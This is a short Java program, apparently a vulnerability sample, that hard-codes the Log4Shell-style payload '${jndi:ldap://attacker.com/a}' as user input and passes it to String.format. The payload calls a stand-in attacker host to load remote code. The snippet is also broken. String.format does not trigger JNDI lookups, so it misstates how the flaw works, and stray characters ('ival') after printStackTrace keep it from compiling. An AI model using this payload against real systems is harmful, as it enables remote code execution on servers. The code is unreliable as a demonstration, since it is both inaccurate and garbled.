import java.util.*;

class Main {
    public static void main(String[] args) {
        try {
            String userInput = "${jndi:ldap://attacker.com/a}";
            System.out.println(String.format(userInput));
        } catch (Exception e) {
            e.printStackTrace();ival
        }
    }
}